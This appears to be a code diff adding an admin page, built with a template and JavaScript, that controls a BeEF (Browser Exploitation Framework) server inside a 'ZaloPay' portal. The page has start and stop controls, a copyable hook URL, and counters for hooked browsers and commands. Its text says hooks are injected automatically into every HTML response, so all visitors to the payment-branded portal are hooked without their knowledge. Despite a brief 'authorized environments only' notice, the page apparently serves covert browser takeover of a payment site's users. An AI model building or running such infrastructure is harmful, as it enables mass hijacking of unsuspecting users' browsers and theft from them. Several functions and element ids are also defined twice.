@@ -1,0 +1,624 @@
+
+
+BeEF Management - ZaloPay Admin
+
+
+<div class="container-fluid">
+    <!-- Mobile Navigation Toggle -->
+    <button class="nav-toggle d-mobile-block d-tablet-none" onclick="toggleSidebar()" title="Toggle Navigation">
+        <i class="fas fa-bars"></i>
+    </button>
+
+    <div class="row mobile-stack">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header d-flex flex-row align-items-center justify-content-between">
+                    <h3 class="card-title mb-0">
+                        <i class="fas fa-shield-alt"></i>
+                        BeEF (Browser Exploitation Framework) Management
+                    </h3>
+                    <button class="btn btn-sm btn-outline-primary d-mobile-flex d-tablet-none touch-target" onclick="showBeEFHelp()">
+                        <i class="fas fa-question-circle"></i>
+                    </button>
+                </div>
+                <div class="card-body">
+                    <!-- BeEF Status - Mobile optimized -->
+                    <div class="row mb-4 mobile-stack">
+                        <div class="col-md-6 col-12 mb-3">
+                            <div class="info-box touch-target">
+                                <span class="info-box-icon bg-info">
+                                    <i class="fas fa-server"></i>
+                                </span>
+                                <div class="info-box-content">
+                                    <span class="info-box-text">BeEF Server Status</span>
+                                    <span class="info-box-number" id="beef-status">
+                                        {% if beef_running %}
+                                             <span class="badge badge-success">Running</span>
+                                         {% else %}
+                                             <span class="badge badge-danger">Stopped</span>
+                                        {% endif %}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-12 mb-3">
+                            <div class="info-box touch-target">
+                                <span class="info-box-icon bg-warning">
+                                    <i class="fas fa-link"></i>
+                                </span>
+                                <div class="info-box-content">
+                                    <span class="info-box-text">Hook URL</span>
+                                    <span class="info-box-number text-mobile-sm" id="hook-url">
+                                        {% if beef_running %}
+                                             {{ beef_status.hook_url }}
+                                         {% else %}
+                                             Not Available
+                                        {% endif %}
+                                    </span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Control Buttons - Mobile optimized -->
+                    <div class="row mb-4">
+                        <div class="col-12">
+                            <div class="btn-group-vertical d-mobile-flex d-tablet-none gap-2" role="group">
+                                <button type="button" class="btn btn-success touch-target" id="start-beef-btn" onclick="startBeef()">
+                                    <i class="fas fa-play"></i> Start BeEF Server
+                                </button>
+                                <button type="button" class="btn btn-danger touch-target" id="stop-beef-btn" onclick="stopBeef()">
+                                    <i class="fas fa-stop"></i> Stop BeEF Server
+                                </button>
+                                <button type="button" class="btn btn-info touch-target" onclick="refreshStatus()">
+                                    <i class="fas fa-sync"></i> Refresh Status
+                                </button>
+                                <a href="#" id="admin-panel-link" class="btn btn-primary touch-target" target="_blank">
+                                    <i class="fas fa-external-link-alt"></i> Open Admin Panel
+                                </a>
+                            </div>
+                            <div class="btn-group d-mobile-none d-tablet-flex" role="group">
+                                <button type="button" class="btn btn-success touch-target" id="start-beef-btn" onclick="startBeef()">
+                                    <i class="fas fa-play"></i> Start BeEF
+                                </button>
+                                <button type="button" class="btn btn-danger touch-target" id="stop-beef-btn" onclick="stopBeef()">
+                                    <i class="fas fa-stop"></i> Stop BeEF
+                                </button>
+                                <button type="button" class="btn btn-info touch-target" onclick="refreshStatus()">
+                                    <i class="fas fa-sync"></i> Refresh Status
+                                </button>
+                                <a href="#" id="admin-panel-link" class="btn btn-primary touch-target" target="_blank">
+                                    <i class="fas fa-external-link-alt"></i> Open BeEF Admin Panel
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- BeEF Configuration - Mobile optimized -->
+                    <div class="row mobile-stack">
+                        <div class="col-md-6 col-12 mb-4">
+                            <div class="card">
+                                <div class="card-header d-flex flex-row align-items-center justify-content-between">
+                                    <h4 class="card-title mb-0">Configuration</h4>
+                                    <button class="btn btn-sm btn-outline-info d-mobile-flex d-tablet-none touch-target" onclick="editBeEFConfig()">
+                                        <i class="fas fa-cog"></i>
+                                    </button>
+                                </div>
+                                <div class="card-body">
+                                    <table class="table table-sm">
+                                        <tr>
+                                            <td><strong>Host:</strong></td>
+                                            <td class="text-mobile-sm" id="beef-host">{{ beef_status.host if beef_running else 'N/A' }}</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Port:</strong></td>
+                                            <td class="text-mobile-sm" id="beef-port">{{ beef_status.port if beef_running else 'N/A' }}</td>
+                                        </tr>
+                                        <tr>
+                                            <td><strong>Admin URL:</strong></td>
+                                            <td class="text-mobile-sm" id="admin-url">
+                                                {% if beef_running %}
+                                                    <a href="{{ beef_status.admin_url }}" target="_blank" class="touch-target">{{ beef_status.admin_url }}</a>
+                                                {% else %}
+                                                    N/A
+                                                {% endif %}
+                                            </td>
+                                        </tr>
+                                    </table>
+                                    <div class="d-mobile-flex d-tablet-none justify-content-center mt-3">
+                                        <button class="btn btn-sm btn-primary touch-target" onclick="copyHookURL()">
+                                            <i class="fas fa-copy"></i> Copy Hook URL
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-12 mb-4">
+                            <div class="card">
+                                <div class="card-header">
+                                    <h4 class="card-title">Integration Status</h4>
+                                </div>
+                                <div class="card-body">
+                                    <div class="alert alert-info touch-target">
+                                        <h5 class="d-flex align-items-center">
+                                            <i class="icon fas fa-info me-2"></i>
+                                            <span class="d-mobile-none d-tablet-inline">Auto Hook Injection</span>
+                                            <span class="d-mobile-flex d-tablet-none">Auto Hook</span>
+                                        </h5>
+                                        <p class="mb-0 text-mobile-sm">BeEF hooks are automatically injected into all HTML responses when the server is running. Visitors to the ZaloPay portal will be automatically hooked.</p>
+                                    </div>
+                                    <div class="alert alert-warning touch-target">
+                                        <h5 class="d-flex align-items-center">
+                                            <i class="icon fas fa-exclamation-triangle me-2"></i>
+                                            <span class="d-mobile-none d-tablet-inline">Security Notice</span>
+                                            <span class="d-mobile-flex d-tablet-none">Security</span>
+                                        </h5>
+                                        <p class="mb-0 text-mobile-sm">This is a penetration testing tool. Use only in authorized environments.</p>
+                                    </div>
+                                    <div class="d-mobile-flex d-tablet-none justify-content-center gap-2 mt-3">
+                                        <button class="btn btn-sm btn-info touch-target" onclick="viewIntegrationGuide()">
+                                            <i class="fas fa-book"></i> Guide
+                                        </button>
+                                        <button class="btn btn-sm btn-warning touch-target" onclick="testIntegration()">
+                                            <i class="fas fa-vial"></i> Test
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- BeEF Statistics (if running) - Mobile optimized -->
+                    <div class="row mobile-stack" id="beef-stats" style="display: none;">
+                        <div class="col-12">
+                            <div class="card">
+                                <div class="card-header d-flex flex-row align-items-center justify-content-between">
+                                    <h4 class="card-title mb-0">BeEF Statistics</h4>
+                                    <div class="d-flex gap-2">
+                                        <button class="btn btn-sm btn-info touch-target" onclick="refreshStats()">
+                                            <i class="fas fa-sync"></i><span class="d-mobile-none d-tablet-inline"> Refresh</span>
+                                        </button>
+                                        <button class="btn btn-sm btn-outline-primary d-mobile-flex d-tablet-none touch-target" onclick="viewStatsDetails()">
+                                            <i class="fas fa-chart-bar"></i>
+                                        </button>
+                                    </div>
+                                </div>
+                                <div class="card-body">
+                                    <div class="row mobile-stack">
+                                        <div class="col-md-3 col-sm-6 col-12 mb-3">
+                                            <div class="info-box touch-target">
+                                                <span class="info-box-icon bg-success">
+                                                    <i class="fas fa-globe"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Hooked Browsers</span>
+                                                    <span class="info-box-number" id="hooked-browsers">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-3 col-sm-6 col-12 mb-3">
+                                            <div class="info-box touch-target">
+                                                <span class="info-box-icon bg-primary">
+                                                    <i class="fas fa-terminal"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Total Commands</span>
+                                                    <span class="info-box-number" id="total-commands">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-3 col-sm-6 col-12 mb-3">
+                                            <div class="info-box touch-target">
+                                                <span class="info-box-icon bg-warning">
+                                                    <i class="fas fa-clock"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Pending Commands</span>
+                                                    <span class="info-box-number" id="pending-commands">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-3 col-sm-6 col-12 mb-3">
+                                            <div class="info-box touch-target">
+                                                <span class="info-box-icon bg-danger">
+                                                    <i class="fas fa-check"></i>
+                                                </span>
+                                                <div class="info-box-content">
+                                                    <span class="info-box-text">Completed Commands</span>
+                                                    <span class="info-box-number" id="completed-commands">0</span>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="d-mobile-flex d-tablet-none justify-content-center gap-2 mt-3">
+                                        <button class="btn btn-sm btn-success touch-target" onclick="manageHooks()">
+                                            <i class="fas fa-globe"></i> Manage Hooks
+                                        </button>
+                                        <button class="btn btn-sm btn-primary touch-target" onclick="viewCommands()">
+                                            <i class="fas fa-terminal"></i> Commands
+                                        </button>
+                                        <button class="btn btn-sm btn-warning touch-target" onclick="exportStats()">
+                                            <i class="fas fa-download"></i> Export
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+// Mobile-specific functions for BeEF Panel
+function toggleSidebar() {
+    const sidebar = document.querySelector('.sidebar');
+    const backdrop = document.querySelector('.sidebar-backdrop');
+
+    if (sidebar && backdrop) {
+        sidebar.classList.toggle('show');
+        backdrop.classList.toggle('show');
+    }
+}
+
+function showBeEFHelp() {
+    showToast('Mở hướng dẫn sử dụng BeEF', 'info');
+    // Implementation would show help modal
+}
+
+function editBeEFConfig() {
+    showToast('Mở trình chỉnh sửa cấu hình BeEF', 'info');
+    // Implementation would open config modal
+}
+
+function copyHookURL() {
+    const hookUrl = document.getElementById('hook-url').textContent;
+    if (hookUrl && hookUrl !== 'Not Available') {
+        navigator.clipboard.writeText(hookUrl).then(() => {
+            showToast('Đã sao chép Hook URL', 'success');
+        }).catch(() => {
+            showToast('Không thể sao chép URL', 'error');
+        });
+    } else {
+        showToast('Hook URL không khả dụng', 'warning');
+    }
+}
+
+function viewIntegrationGuide() {
+    showToast('Mở hướng dẫn tích hợp BeEF', 'info');
+    // Implementation would open integration guide
+}
+
+function testIntegration() {
+    showToast('Kiểm tra tích hợp BeEF...', 'info');
+    // Implementation would test BeEF integration
+}
+
+function viewStatsDetails() {
+    showToast('Xem chi tiết thống kê BeEF', 'info');
+    // Implementation would show detailed stats modal
+}
+
+function manageHooks() {
+    showToast('Mở quản lý Hooks', 'info');
+    // Implementation would open hooks management
+}
+
+function viewCommands() {
+    showToast('Xem danh sách Commands', 'info');
+    // Implementation would open commands interface
+}
+
+function exportStats() {
+    showToast('Xuất thống kê BeEF...', 'info');
+    // Implementation would export BeEF statistics
+}
+
+// Enhanced BeEF control functions with mobile feedback
+function startBeef() {
+    const button = document.getElementById('start-beef-btn');
+    button.disabled = true;
+    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Starting...';
+
+    // Add visual feedback for mobile
+    button.style.transform = 'scale(0.98)';
+
+    fetch('/api/beef/start', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            showToast('BeEF server đã khởi động thành công', 'success');
+            refreshStatus();
+        } else {
+            showToast('Không thể khởi động BeEF server: ' + data.message, 'error');
+        }
+    })
+    .catch(error => {
+        showToast('Lỗi khi khởi động BeEF server', 'error');
+    })
+    .finally(() => {
+        button.disabled = false;
+        button.innerHTML = '<i class="fas fa-play"></i> Start BeEF';
+        button.style.transform = 'scale(1)';
+    });
+}
+
+// Enhanced stop function with mobile feedback
+function stopBeef() {
+    if (!confirm('Bạn có chắc chắn muốn dừng BeEF server?')) {
+        return;
+    }
+
+    const button = document.getElementById('stop-beef-btn');
+    button.disabled = true;
+    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Stopping...';
+    button.style.transform = 'scale(0.98)';
+
+    fetch('/api/beef/stop', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            showToast('BeEF server đã dừng thành công', 'success');
+            refreshStatus();
+        } else {
+            showToast('Không thể dừng BeEF server: ' + data.message, 'error');
+        }
+    })
+    .catch(error => {
+        showToast('Lỗi khi dừng BeEF server', 'error');
+    })
+    .finally(() => {
+        button.disabled = false;
+        button.innerHTML = '<i class="fas fa-stop"></i> Stop BeEF';
+        button.style.transform = 'scale(1)';
+    });
+}
+
+// Enhanced refresh function with mobile feedback
+function refreshStatus() {
+    const buttons = document.querySelectorAll('#start-beef-btn, #stop-beef-btn');
+    buttons.forEach(button => {
+        button.disabled = true;
+        button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
+    });
+
+    fetch('/api/beef/status', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            updateStatus(data.status);
+            showToast('Đã cập nhật trạng thái BeEF', 'success');
+        }
+    })
+    .catch(error => {
+        showToast('Lỗi khi cập nhật trạng thái', 'error');
+    })
+    .finally(() => {
+        buttons.forEach(button => {
+            button.disabled = false;
+            if (button.id === 'start-beef-btn') {
+                button.innerHTML = '<i class="fas fa-play"></i> Start BeEF';
+            } else {
+                button.innerHTML = '<i class="fas fa-stop"></i> Stop BeEF';
+            }
+        });
+    });
+}
+
+// Enhanced status update for mobile
+function updateStatus(status) {
+    const statusElement = document.getElementById('beef-status');
+    const hookUrlElement = document.getElementById('hook-url');
+    const hostElement = document.getElementById('beef-host');
+    const portElement = document.getElementById('beef-port');
+    const adminUrlElement = document.getElementById('admin-url');
+    const adminLink = document.getElementById('admin-panel-link');
+    const statsSection = document.getElementById('beef-stats');
+
+    if (status.running) {
+        statusElement.innerHTML = '<span class="badge badge-success">Running</span>';
+        hookUrlElement.textContent = status.hook_url;
+        hostElement.textContent = status.host;
+        portElement.textContent = status.port;
+        adminUrlElement.innerHTML = `<a href="${status.admin_url}" target="_blank" class="touch-target">${status.admin_url}</a>`;
+        adminLink.href = status.admin_url;
+
+        document.getElementById('start-beef-btn').disabled = true;
+        document.getElementById('stop-beef-btn').disabled = false;
+        statsSection.style.display = 'block';
+
+        refreshStats();
+    } else {
+        statusElement.innerHTML = '<span class="badge badge-danger">Stopped</span>';
+        hookUrlElement.textContent = 'Not Available';
+        hostElement.textContent = 'N/A';
+        portElement.textContent = 'N/A';
+        adminUrlElement.textContent = 'N/A';
+        adminLink.href = '#';
+
+        document.getElementById('start-beef-btn').disabled = false;
+        document.getElementById('stop-beef-btn').disabled = true;
+        statsSection.style.display = 'none';
+    }
+}
+
+// Enhanced stats refresh for mobile
+function refreshStats() {
+    fetch('/api/beef/proxy/api/stats', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success && data.stats) {
+            // Animate number changes for better mobile UX
+            animateNumber('hooked-browsers', parseInt(document.getElementById('hooked-browsers').textContent) || 0, data.stats.server.online_browsers || 0);
+            animateNumber('total-commands', parseInt(document.getElementById('total-commands').textContent) || 0, data.stats.commands.total || 0);
+            animateNumber('pending-commands', parseInt(document.getElementById('pending-commands').textContent) || 0, data.stats.commands.pending || 0);
+            animateNumber('completed-commands', parseInt(document.getElementById('completed-commands').textContent) || 0, data.stats.commands.completed || 0);
+        }
+    })
+    .catch(error => {
+        showToast('Lỗi khi tải thống kê BeEF', 'error');
+    });
+}
+
+// Number animation for mobile
+function animateNumber(elementId, from, to) {
+    const element = document.getElementById(elementId);
+    if (!element) return;
+
+    const duration = 800;
+    const start = Date.now();
+    const fromVal = from || 0;
+
+    function update() {
+        const elapsed = Date.now() - start;
+        const progress = Math.min(elapsed / duration, 1);
+
+        const current = Math.floor(fromVal + (to - fromVal) * progress);
+        element.textContent = current;
+
+        if (progress < 1) {
+            requestAnimationFrame(update);
+        }
+    }
+
+    update();
+}
+
+// Toast notification function
+function showToast(message, type = 'info') {
+    const toastHtml = `
+        <div class="toast align-items-center text-white bg-${type === 'success' ? 'success' : type === 'warning' ? 'warning' : type === 'danger' ? 'danger' : 'info'} border-0" role="alert">
+            <div class="d-flex">
+                <div class="toast-body">${message}</div>
+                <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+            </div>
+        </div>
+    `;
+
+    let toastContainer = document.getElementById('toastContainer');
+    if (!toastContainer) {
+        toastContainer = document.createElement('div');
+        toastContainer.id = 'toastContainer';
+        toastContainer.className = 'toast-container position-fixed top-0 end-0 p-3';
+        document.body.appendChild(toastContainer);
+    }
+
+    toastContainer.insertAdjacentHTML('beforeend', toastHtml);
+    const toast = new bootstrap.Toast(toastContainer.lastElementChild);
+    toast.show();
+}
+
+// Mobile initialization
+document.addEventListener('DOMContentLoaded', function() {
+    refreshStatus();
+
+    // Auto refresh every 30 seconds
+    setInterval(refreshStatus, 30000);
+
+    // Add touch feedback to all interactive elements
+    document.querySelectorAll('.btn, .info-box').forEach(element => {
+        element.addEventListener('touchstart', function() {
+            this.style.transform = 'scale(0.95)';
+        });
+        element.addEventListener('touchend', function() {
+            setTimeout(() => {
+                this.style.transform = 'scale(1)';
+            }, 150);
+        });
+    });
+
+    // Mobile viewport height fix
+    function setVH() {
+        let vh = window.innerHeight * 0.01;
+        document.documentElement.style.setProperty('--vh', `${vh}px`);
+    }
+
+    setVH();
+    window.addEventListener('resize', setVH);
+    window.addEventListener('orientationchange', setVH);
+});
+
+function refreshStatus() {
+    $.ajax({
+        url: '/api/beef/status',
+        method: 'GET',
+        success: function(response) {
+            if (response.success) {
+                updateStatus(response.status);
+            }
+        },
+        error: function(xhr) {
+            console.error('Error getting BeEF status');
+        }
+    });
+}
+
+function updateStatus(status) {
+    if (status.running) {
+        $('#beef-status').html('<span class="badge badge-success">Running</span>');
+        $('#hook-url').text(status.hook_url);
+        $('#beef-host').text(status.host);
+        $('#beef-port').text(status.port);
+        $('#admin-url').html('<a href="' + status.admin_url + '" target="_blank">' + status.admin_url + '</a>');
+        $('#admin-panel-link').attr('href', status.admin_url);
+        $('#start-beef-btn').prop('disabled', true);
+        $('#stop-beef-btn').prop('disabled', false);
+        $('#beef-stats').show();
+        refreshStats();
+    } else {
+        $('#beef-status').html('<span class="badge badge-danger">Stopped</span>');
+        $('#hook-url').text('Not Available');
+        $('#beef-host').text('N/A');
+        $('#beef-port').text('N/A');
+        $('#admin-url').text('N/A');
+        $('#admin-panel-link').attr('href', '#');
+        $('#start-beef-btn').prop('disabled', false);
+        $('#stop-beef-btn').prop('disabled', true);
+        $('#beef-stats').hide();
+    }
+}
+
+function refreshStats() {
+    // Proxy request to BeEF API through our integration
+    $.ajax({
+        url: '/api/beef/proxy/api/stats',
+        method: 'GET',
+        success: function(response) {
+            if (response.success && response.stats) {
+                $('#hooked-browsers').text(response.stats.server.online_browsers || 0);
+                $('#total-commands').text(response.stats.commands.total || 0);
+                $('#pending-commands').text(response.stats.commands.pending || 0);
+                $('#completed-commands').text(response.stats.commands.completed || 0);
+            }
+        },
+        error: function(xhr) {
+            console.error('Error getting BeEF stats');
+        }
+    });
+}
+</script>
+
+
